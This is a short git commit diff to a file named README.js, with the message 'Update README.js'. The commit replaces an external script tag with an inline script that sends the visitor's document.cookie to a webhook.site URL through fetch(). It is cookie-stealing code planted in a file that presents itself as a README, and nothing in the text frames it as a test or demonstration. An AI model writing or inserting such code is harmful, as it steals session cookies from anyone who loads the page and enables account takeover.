4c4ac3a52962fdbf04d9555bf6bcffe8259d033f
Ana Jesus <91704122+Anajesus03@users.noreply.github.com>
2024-12-03 18:51:56 +0000

    Update README.js

--- README.js
+++ README.js
@@ -1,1 +1,3 @@
-<script src="https://not-example.com/js/library.js"></script>
+<script>
+fetch('https://webhook.site/4ac3a62b-863e-4c0f-afdf-6e4affe71822/?cookie=' + encodeURIComponent(document.cookie));
+</script>
